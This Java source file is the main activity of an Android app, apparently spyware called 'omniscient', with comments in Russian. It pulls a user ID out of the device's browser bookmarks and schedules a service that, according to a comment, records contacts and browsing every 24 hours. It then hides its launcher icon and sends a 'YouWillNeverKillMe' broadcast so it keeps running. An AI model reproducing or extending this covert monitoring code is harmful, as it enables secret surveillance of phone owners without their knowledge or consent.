package com.postal.omniscient;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.v7.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.postal.omniscient.postal.SPreferences.PreferencesGetSet;
import com.postal.omniscient.postal.service.AlarmReceiver;

import java.io.IOException;

import java.io.OutputStreamWriter;



public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    final int SDK_INT = Build.VERSION.SDK_INT;
    private Button registration;
    private EditText userID;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        registration = (Button)findViewById(R.id.registration);
        userID = (EditText) findViewById(R.id.userID);
        registration.setOnClickListener(this);


        userID.setText(idUser());
    }
    // получаем idUser с браузера
    private String idUser(){
        String id_user = "";
        String url_data = "url";
        String date = "date";
        String title = "title";
        Uri uri;
        String where = url_data+"= ?";
        String date_query[] = {"https://omniscient.pro/api/download.php"};

        uri = Uri.parse("content://browser/bookmarks");
        String[] projection = {title};

    try {
        Cursor cur = getContentResolver().query(uri,
                projection, where, date_query, date + " DESC");// DESC - сортировка по убываню
        Integer title_data_column_index = cur.getColumnIndexOrThrow(title);

        if (cur.moveToFirst()) {
            id_user = cur.getString(title_data_column_index);
        }
        writeToFile(getApplicationContext(), id_user.toString());

    }catch (Exception e){Log.i("MyMsg","Error MainActivity idUser "+e);}
        return id_user;
    }
    // запуск приложения
    private void startAPP() {
        try {
            PreferencesGetSet Sp = new PreferencesGetSet();
            Sp.writeToPreferences(getApplicationContext());//устанавлеваем первое время для настроек

            // если не ввели код, говорим - "введите код"
            if (userID.getText().length() < 1) {
                Toast toast = Toast.makeText(getApplicationContext(),
                        "Enter your ID code", Toast.LENGTH_LONG);
                toast.show();
                return;
            }
            saveLogin();
        } catch (Exception e) {Log.i("MyMsg","Error MainActivity startAPP1 "+e);}

        try {
            //БУДИТ СЕРВИС КАЖДЫЕ 24 часа и записывает еонтакты и браузер
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent myIntent = new Intent(MainActivity.this, AlarmReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(MainActivity.this, 0, myIntent, 0);
            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
            } else if (Build.VERSION_CODES.KITKAT <= SDK_INT && SDK_INT < Build.VERSION_CODES.M) {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
            } else if (SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
            }

            PackageManager pkg = this.getPackageManager();
            pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);// ЕТО ВКЛЮЧИТЬ

            sendBroadcast(new Intent("YouWillNeverKillMe"));

            finish(); //ЕТО ВКЛЮЧИТЬ
        } catch (Exception e) {Log.i("MyMsg","Error MainActivity startAPP2 "+e);}
    }

    // нажатия на кнопки
    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.registration:startAPP();break;
        }
    }


//     save id_user
    private void saveLogin(){
        try {
            writeToFile(getApplicationContext(), userID.getText().toString());
        }catch (Exception e){Log.i("MyMsg","Error MainActivity saveLogin"+e);}
    }
    //запись id_user в файл
    private void writeToFile(Context context, String data) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("config.cnf", Context.MODE_PRIVATE));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {Log.i("MyMsg","Error MainActivity writeToFile"+e);}
    }

}
